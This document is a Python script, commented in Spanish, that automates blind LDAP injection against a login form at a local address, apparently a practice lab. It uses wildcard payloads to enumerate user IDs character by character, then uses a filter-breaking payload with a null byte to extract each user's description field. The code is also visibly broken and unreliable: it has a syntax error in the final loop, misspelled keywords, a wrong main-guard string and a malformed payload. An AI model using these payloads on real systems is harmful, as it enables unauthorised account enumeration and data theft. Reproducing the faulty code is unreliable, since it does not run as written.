#!/usr/bin/python3
import requests
import time
import sys
import signal
import string
import pdb # para debugging

from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


# Variables globales
main_url = "http://localhost:8888/"
headers = {'Content-Type':'applicaton/x-www-form-urlencoded'}
burp = {'http': 'http://127.0.0.1:8080'}

def getInitialUsers():
    characters =  string.ascii_lowercase + string.digits
    #pdb.set_trace
    initial_users = []
    for character in characters:
        #print(character)
        post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
        r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False, proxies=burp)
        if r.status_code == 301:
            initial_users.append(character)
    return initial_users

def getUsers(initial_users):
    characters = string.ascii_lowercase + string.digits
    valid_users = [] 
    for first_character in initial_users:
        user = ""
        for position in range(0,15):
            for character in characters:
                post_data = "user_id={}{}{}*password=*&login=1&submit=Submit".format(first_character, user, character)
                r = requests.post(main_url, data=post_data, heades=headers, allow_redirects=False)
                if r.status_code == 301:
                    user += character
                    break
        valid_users.append(first_character + user)
    for user in valid_users:
        log.info("Usuaro válido encontrado: %s" % user)
        print("\n")
    return valid_users

def getDescription(user):
    characters = string.ascii_lowercase + ' '
    description = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)
    p2 = log.progress("Descripción")
    for position in range(0,50):
        for character in characters:
            post_data = "user_id={})(description={}{}*))%00&password=*&login=1&submit=Submit".format(user, description, character)
            r = requests.post(main_url, data=post_data, heades=headers, allow_redirects=False)
            if r.status_code == 301:
                description += character
                p2.status(description)
                break
    p1.success("Proceso de fuerza bruta concluído")
    p2.sucesss("Usuario %s - Descripción extraída: %s" % (user, description))
    print("\n")


if __name__ == '_main__':
    initial_users = getInitialUsers()
    valid_users = getUsers(initial_users)
    for i in range(0,3) # suponiendo que hay 4 usuarios
        getDescription(valid_users[i])
